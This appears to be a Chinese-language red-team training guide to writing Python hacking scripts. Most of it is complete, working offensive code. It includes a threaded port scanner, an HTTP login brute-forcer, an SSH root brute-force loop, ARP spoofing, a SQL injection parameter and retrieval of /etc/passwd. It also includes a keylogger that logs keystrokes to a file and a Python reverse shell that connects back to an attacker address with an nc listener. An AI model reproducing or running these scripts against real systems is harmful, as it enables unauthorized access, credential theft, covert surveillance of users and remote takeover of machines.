@@ -1,0 +1,468 @@
+================================================================================
+      Python黑客脚本基础 — 红队必备编程技能
+================================================================================
+学习目标:
+  1. 掌握Python基础语法 (面向安全应用)
+  2. 编写端口扫描器
+  3. 编写简易暴力破解器
+  4. 编写HTTP请求脚本
+  5. 自动化安全工具开发
+  6. 理解常用安全库: requests, scapy, paramiko
+
+推荐学习时间: 2周 (每天3小时中的1小时编程练习)
+================================================================================
+
+============================================================
+第一部分：Python基础速成 (安全向)
+============================================================
+
+【1.1 Python环境】
+
+  检查Python版本:
+    $ python3 --version
+
+  安装pip和常用库:
+    $ sudo pacman -S python-pip python-requests python-scapy python-paramiko
+
+【1.2 基础语法 (重点掌握)】
+
+  变量和数据类型:
+    target_ip = "192.168.1.100"      # 字符串 - 存储目标IP
+    port = 80                         # 整数 - 端口号
+    is_open = False                   # 布尔 - 端口是否开放
+    targets = ["192.168.1.1","192.168.1.2"]  # 列表 - 批量目标
+
+  条件判断:
+    if port == 80:
+        print("发现HTTP服务")
+    elif port == 443:
+        print("发现HTTPS服务")
+    else:
+        print(f"发现服务在端口 {port}")
+
+  循环:
+    # 遍历端口列表
+    for port in range(1, 1025):
+        if scan_port(target_ip, port):
+            print(f"端口 {port} 开放")
+
+  函数:
+    def scan_port(ip, port):
+        """扫描单个端口"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((ip, port))
+        sock.close()
+        return result == 0
+
+  文件操作:
+    # 读取密码字典
+    with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
+        for line in f:
+            password = line.strip()
+            try_login(username, password)
+
+  异常处理:
+    try:
+        response = requests.get("http://" + target)
+    except requests.exceptions.ConnectionError:
+        print("连接失败")
+
+  命令行参数 (argparse):
+    import argparse
+    parser = argparse.ArgumentParser(description="简易扫描器")
+    parser.add_argument("-t", "--target", required=True, help="目标IP")
+    parser.add_argument("-p", "--ports", default="1-1000", help="端口范围")
+    args = parser.parse_args()
+    print(f"扫描目标: {args.target}, 端口: {args.ports}")
+
+============================================================
+第二部分：实战脚本编写
+============================================================
+
+【2.1 端口扫描器】
+
+  目标: 编写一个多线程TCP端口扫描器
+
+  完整代码 (scanner.py):
+
+    #!/usr/bin/env python3
+    """简易TCP端口扫描器"""
+    import socket
+    import argparse
+    import threading
+    from queue import Queue
+
+    def scan_port(ip, port, timeout=1):
+        """扫描单个端口，返回(port, is_open)"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            if result == 0:
+                return (port, True)
+            return (port, False)
+        except:
+            return (port, False)
+
+    def worker(ip, queue, results, timeout):
+        """工作线程"""
+        while not queue.empty():
+            port = queue.get()
+            p, is_open = scan_port(ip, port, timeout)
+            if is_open:
+                results.append(p)
+            queue.task_done()
+
+    def main():
+        parser = argparse.ArgumentParser(description="多线程TCP端口扫描器")
+        parser.add_argument("-t", "--target", required=True, help="目标IP或域名")
+        parser.add_argument("-p", "--ports", default="1-1000", help="端口范围, 如 1-1000 或 80,443,8080")
+        parser.add_argument("-T", "--threads", type=int, default=50, help="线程数")
+        parser.add_argument("--timeout", type=float, default=1.0, help="超时秒数")
+        args = parser.parse_args()
+
+        target = socket.gethostbyname(args.target)
+        print(f"[*] 扫描目标: {target}")
+
+        ports = []
+        if "-" in args.ports:
+            start, end = map(int, args.ports.split("-"))
+            ports = list(range(start, end + 1))
+        else:
+            ports = [int(p) for p in args.ports.split(",")]
+
+        print(f"[*] 扫描端口: {len(ports)} 个")
+        print(f"[*] 线程数: {args.threads}")
+
+        queue = Queue()
+        for port in ports:
+            queue.put(port)
+
+        results = []
+        threads = []
+        for _ in range(args.threads):
+            t = threading.Thread(target=worker, args=(target, queue, results, args.timeout))
+            t.start()
+            threads.append(t)
+
+        queue.join()
+
+        print(f"\n[+] 开放端口 ({len(results)}):")
+        for port in sorted(results):
+            print(f"    {port}/tcp 开放")
+
+    if __name__ == "__main__":
+        main()
+
+  运行:
+    $ python3 scanner.py -t 192.168.1.100 -p 1-1000 -T 100
+
+【2.2 HTTP爆破脚本】
+
+  目标: 编写针对HTTP表单登录的暴力破解脚本
+
+  完整代码 (http_brute.py):
+
+    #!/usr/bin/env python3
+    """HTTP表单登录爆破"""
+    import requests
+    import argparse
+    import sys
+
+    def brute_http_form(url, username, wordlist, user_field="username",
+                        pass_field="password", error_msg="incorrect",
+                        method="POST"):
+        """HTTP表单暴力破解"""
+        successful = False
+
+        with open(wordlist, "r", errors="ignore") as f:
+            for line in f:
+                password = line.strip()
+                if not password:
+                    continue
+
+                data = {user_field: username, pass_field: password}
+
+                try:
+                    if method.upper() == "POST":
+                        r = requests.post(url, data=data, timeout=10,
+                                         allow_redirects=False)
+                    else:
+                        r = requests.get(url, params=data, timeout=10,
+                                        allow_redirects=False)
+
+                    if error_msg.lower() not in r.text.lower():
+                        print(f"\n[+] 成功! 密码: {password}")
+                        successful = True
+                        break
+                    else:
+                        print(f"[-] 失败: {password}", end="\r")
+                        sys.stdout.flush()
+
+                except Exception as e:
+                    print(f"[!] 错误: {e}")
+                    continue
+
+        if not successful:
+            print("\n[-] 密码未找到")
+        return successful
+
+    if __name__ == "__main__":
+        parser = argparse.ArgumentParser(description="HTTP表单爆破")
+        parser.add_argument("-u", "--url", required=True, help="目标URL")
+        parser.add_argument("-U", "--username", required=True, help="用户名")
+        parser.add_argument("-w", "--wordlist", required=True, help="密码字典")
+        parser.add_argument("--user-field", default="username", help="用户名字段名")
+        parser.add_argument("--pass-field", default="password", help="密码字段名")
+        parser.add_argument("-e", "--error", default="incorrect", help="错误标识字符串")
+        parser.add_argument("-m", "--method", default="POST", help="HTTP方法")
+        args = parser.parse_args()
+
+        brute_http_form(args.url, args.username, args.wordlist,
+                       args.user_field, args.pass_field, args.error, args.method)
+
+【2.3 使用requests库做Web测试】
+
+  常用Web测试操作:
+
+    import requests
+
+    # 基础GET请求
+    r = requests.get("http://testphp.vulnweb.com")
+    print(r.status_code)      # 状态码
+    print(r.headers)           # 响应头
+    print(r.text[:500])        # 响应内容前500字
+
+    # 带参数的GET请求
+    params = {"id": "1' OR 1=1--"}
+    r = requests.get("http://example.com/page.php", params=params)
+
+    # POST请求
+    data = {"username": "admin", "password": "admin"}
+    r = requests.post("http://example.com/login.php", data=data)
+
+    # 设置Cookie
+    cookies = {"PHPSESSID": "abc123", "security": "low"}
+    r = requests.get("http://example.com/", cookies=cookies)
+
+    # 设置User-Agent (伪装)
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"}
+    r = requests.get("http://example.com", headers=headers)
+
+    # Session保持 (自动管理Cookie)
+    s = requests.Session()
+    s.post("http://example.com/login.php", data={"user":"admin","pass":"pass"})
+    r = s.get("http://example.com/admin.php")  # 自动带登录Cookie
+
+    # 代理设置
+    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+    r = requests.get("http://example.com", proxies=proxies, verify=False)
+
+【2.4 使用scapy构造网络包】
+
+  scapy是强大的网络包操作库:
+
+    from scapy.all import *
+
+    # 构造ICMP ping包
+    packet = IP(dst="192.168.1.1")/ICMP()
+    response = sr1(packet, timeout=2)
+    if response:
+        print("主机在线")
+
+    # 构造TCP SYN包 (半开放扫描)
+    for port in [22, 80, 443, 3306]:
+        packet = IP(dst="192.168.1.100")/TCP(dport=port, flags="S")
+        response = sr1(packet, timeout=1, verbose=0)
+        if response and response.haslayer(TCP):
+            if response[TCP].flags == 18:  # SYN-ACK
+                print(f"端口 {port} 开放")
+
+    # ARP欺骗简单实现
+    arp_response = ARP(pdst="192.168.1.100", hwdst="ff:ff:ff:ff:ff:ff", psrc="192.168.1.1")
+    send(arp_response, verbose=0)
+
+【2.5 使用paramiko做SSH操作】
+
+  SSH自动化:
+
+    import paramiko
+
+    # SSH连接
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect("192.168.1.100", username="root", password="toor")
+
+    # 执行命令
+    stdin, stdout, stderr = ssh.exec_command("whoami")
+    print(stdout.read().decode())
+
+    # 上传文件 (SFTP)
+    sftp = ssh.open_sftp()
+    sftp.put("local_file.txt", "/tmp/remote_file.txt")
+
+    # 下载文件
+    sftp.get("/etc/passwd", "local_passwd.txt")
+
+    ssh.close()
+
+    # SSH暴力破解示例
+    with open("passwords.txt") as f:
+        for password in f:
+            password = password.strip()
+            try:
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect("192.168.1.100", username="root",
+                           password=password, timeout=5)
+                print(f"[+] 成功: root:{password}")
+                ssh.close()
+                break
+            except paramiko.AuthenticationException:
+                print(f"[-] 错误密码: {password}")
+            except:
+                continue
+
+============================================================
+第三部分：实用小工具编写练习
+============================================================
+
+【练习1: 简易Web目录扫描器】
+
+  要求:
+  - 输入URL和字典文件
+  - 返回存在的目录/文件 (HTTP 200)
+  - 多线程加速
+  - 支持状态码过滤 (200, 301, 403)
+
+【练习2: 子域名枚举器】
+
+  要求:
+  - 从字典读取子域名前缀
+  - 通过DNS查询检查是否存在
+  - 使用socket.gethostbyname() 或 dns.resolver
+
+【练习3: Hash破解验证器】
+
+  要求:
+  - 读取hash文件 (格式: hash:plaintext)
+  - 对密码字典里的每个密码做hash
+  - 对比找到匹配的
+
+【练习4: 简易Keylogger (仅用于学习)】
+
+  要求:
+  - 使用pynput库捕获键盘输入
+  - 保存到文件
+
+  安装: pip install pynput
+
+  from pynput import keyboard
+
+  def on_press(key):
+      try:
+          with open("keylog.txt", "a") as f:
+              f.write(f"{key.char}")
+      except AttributeError:
+          with open("keylog.txt", "a") as f:
+              f.write(f"[{key}]")
+
+  with keyboard.Listener(on_press=on_press) as listener:
+      listener.join()
+
+【练习5: 反向Shell】
+
+  客户端 (攻击机):
+    nc -lvp 4444
+
+  Python脚本 (目标机):
+    import socket, subprocess, os
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("10.0.0.1", 4444))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    subprocess.call(["/bin/sh", "-i"])
+
+============================================================
+第四部分：Python安全工具库速查
+============================================================
+
+  requests     HTTP请求库, 发GET/POST请求
+  scapy        网络包构造和嗅探
+  paramiko     SSH客户端
+  socket       TCP/UDP网络编程
+  hashlib      哈希计算 (md5, sha1, sha256)
+  base64       Base64编解码
+  re           正则表达式
+  json         JSON解析
+  argparse     命令行参数解析
+  threading    多线程
+  queue        线程安全队列
+  os/subprocess 系统命令执行
+  beautifulsoup4 HTML解析 (sudo pacman -S python-beautifulsoup4)
+  pwntools     CTF二进制利用 (sudo pacman -S python-pwntools)
+
+============================================================
+第五部分：学习路线指引
+============================================================
+
+  第1天: Python基础 — 变量、条件、循环、函数
+    实践: 写一个简单的计算器
+
+  第2天: 文件操作和字符串处理
+    实践: 读取密码字典, 统计每个长度的密码数量
+
+  第3天: 网络编程基础 (socket)
+    实践: 写一个简单的TCP客户端连接baidu.com:80
+
+  第4天: HTTP请求 (requests库)
+    实践: 自动爬取网页标题
+
+  第5天: 端口扫描器编写
+    实践: 完成2.1节的多线程扫描器
+
+  第6天: HTTP爆破脚本
+    实践: 完成2.2节的爆破脚本
+
+  第7天: scapy网络包操作
+    实践: ICMP ping扫描
+
+  第8天: SSH自动化 (paramiko)
+    实践: 批量执行命令到多台服务器
+
+  第9天: 综合项目 — 信息收集工具
+    要求: 输入域名, 自动完成:
+    1. 解析IP地址
+    2. 扫描常见端口
+    3. 获取HTTP响应头
+    4. 查询WHOIS信息
+
+  第10天: 代码审查和改进
+    回顾之前写的脚本, 添加错误处理、日志记录、参数解析
+
+============================================================
+第六部分：调试与优化技巧
+============================================================
+
+  打印调试:
+    print(f"[DEBUG] 变量值: {variable}")
+    import pdb; pdb.set_trace()  # 断点调试
+
+  日志记录:
+    import logging
+    logging.basicConfig(level=logging.INFO,
+                       format='%(asctime)s - %(levelname)s - %(message)s')
+    logging.info("开始扫描")
+    logging.warning("连接超时")
+    logging.error("扫描失败")
+
+  性能优化:
+    使用多线程/多进程
+    设置合理超时时间
+    使用连接池 (requests.Session)
+    缓存DNS解析结果
+
+================================================================================
